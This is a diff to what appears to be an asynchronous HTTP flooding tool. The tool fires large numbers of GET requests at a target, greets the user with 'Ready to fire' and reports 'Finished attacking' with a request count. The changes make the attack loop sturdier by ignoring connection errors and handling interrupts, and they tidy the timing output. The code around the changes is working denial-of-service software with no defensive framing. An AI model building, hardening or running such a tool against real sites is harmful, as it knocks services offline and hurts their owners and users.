@@ -140,8 +140,11 @@ async def main_task(target: str, task_id: int, end_at: float = None):
                         # This way, the server does not discard the data after the requests
                     except Exception:
                         pass
-            except RuntimeError:
+            except (RuntimeError, KeyboardInterrupt):
                 return
+            except aiohttp.ClientConnectionError:
+                # This is fine, ignore it
+                continue
             except Exception as e:
                 print(
                     "({}) !! GET {} - Error: {!r}".format(
@@ -198,20 +201,29 @@ async def main():
             "Warning: Websites that serve content compressed with brotli will cause errors."
         )
         print("You should run `main.py install`.")
-
+    
     try:
         input("Ready to fire. Just press enter. ")
+    except (KeyboardInterrupt, EOFError):
+        print("cancelled.")
+        return
+    start_time = datetime.now()
+    try:        
         print("Starting.")
-        start_time = datetime.now()
         start_event.set()
         timer_task = asyncio.ensure_future(counter_task())
         await asyncio.gather(*tasks)
-        end_time = datetime.now()
         timer_task.cancel()
-        print("Finished attacking %s!" % url.geturl())
-        print("Sent %s requests in %s" % (sent_requests, (end_time - start_time)))
     except KeyboardInterrupt:
         print("Cancelled.")
+    finally:
+        try:
+            timer_task.cancel()
+        except NameError:
+            pass
+        end_time = datetime.now()
+        print("Finished attacking %s!" % url.geturl())
+        print("Sent %s requests in %s" % (sent_requests, pretty_time((end_time - start_time).total_seconds())))
 
 if sys.version_info < (3, 7):
     loop = asyncio.get_event_loop()
